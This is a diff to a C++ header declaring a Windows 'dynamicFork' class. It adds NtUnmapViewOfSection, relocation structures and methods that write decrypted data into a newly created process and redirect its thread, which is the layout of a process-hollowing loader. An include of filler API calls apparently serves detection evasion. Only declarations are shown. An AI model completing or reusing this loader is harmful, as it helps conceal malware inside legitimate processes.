@@ -1,6 +1,27 @@
 #pragma once
 #include <Windows.h>
+#include <exception>
+#include <string>
+#include <iostream>
+#include "apiFillerCalls.h"
 
+
+typedef LONG(WINAPI* NtUnmapViewOfSection)(
+	_In_     HANDLE ProcessHandle,
+	_In_opt_ PVOID  BaseAddress
+);
+
+typedef struct BASE_RELOC_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+} BASE_RELOC_BLOCK, * PBASE_RELOC_BLOCK;
+
+typedef struct BASE_RELOC_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOC_ENTRY, * PBASE_RELOC_ENTRY;
+
+#define TotalRelocationEntries(blockSize) (blockSize - sizeof(BASE_RELOC_BLOCK)) / sizeof(BASE_RELOC_ENTRY)
 
 class dynamicFork
 {
@@ -12,7 +33,7 @@ class dynamicFork
 		} Process;
 
 		//CONTEXT OF THE NEW CREATED PROCESS THREAD
-		PCONTEXT context;
+		PCONTEXT context = new CONTEXT();
 
 		//HEADERS
 		struct {
@@ -20,23 +41,33 @@ class dynamicFork
 			PIMAGE_NT_HEADERS peHeader;
 		} Headers;
 
-		DWORD* imageBase;
+		void* dwCurrentImageBase;
+		void* imageBase;
+
+		PIMAGE_SECTION_HEADER relocSection = NULL;
 
 		//TO DO: add throws()
 
-		int SetHeaders(char* decryptedData);
+		void SetHeaders(char* decryptedData);
 
-		int CreateProcessAndWrite(char* decryptedData);
+		void CreateProcessAndWrite(char* decryptedData);
 
-		void AllocateContext();
+		//void AllocateContext();
 
 		void GetBaseAddrOfNewProcess();
 
 		void WriteDataToProcessBaseAddr(char* decryptedData);
 
+		void FindRelocationSection();
+
+		void ApplyRelocations(DWORD relocDelta, DWORD buffAddr);
+
+		void MemoryProtectionUpdate();
+
 		void SetBaseAddressAndEntryPoint();
 
 		void SetContextAndResumeThread();
+
 
 	public:
 		dynamicFork(char* decryptedData);
